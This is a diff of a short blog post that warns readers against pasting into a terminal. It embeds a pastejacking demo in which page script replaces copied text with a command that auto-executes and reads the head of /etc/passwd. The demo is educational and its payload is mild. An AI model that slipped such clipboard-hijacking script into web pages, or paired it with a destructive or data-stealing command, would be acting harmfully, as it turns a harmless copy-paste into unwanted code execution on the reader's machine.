@@ -5,7 +5,7 @@ date: '2018-04-24 13:11'
 ---
 Have you ever cut/copied/pasted into a terminal window? Here's one of a few reasons why you shouldn't:
 
-note -- another example here: view-source:https://security.love/Pastejacking/
+
 
 ### example 1:
 {::nomarkdown}
@@ -18,6 +18,8 @@ note -- another example here: view-source:https://security.love/Pastejacking/
 {:/}
 
 
+
+
 ### example 2:
 {::nomarkdown}
   <!-- credit to https://security.love/Pastejacking/ -->
@@ -25,7 +27,7 @@ note -- another example here: view-source:https://security.love/Pastejacking/
         <script>
             document.addEventListener('copy', function(e){
                 console.log(e);
-                e.clipboardData.setData('text/plain', 'echo "evil"\r\n');
+                e.clipboardData.setData('text/plain', 'echo "bad idea!" && head /etc/passwd\r\n');
                 e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
             });
         </script>
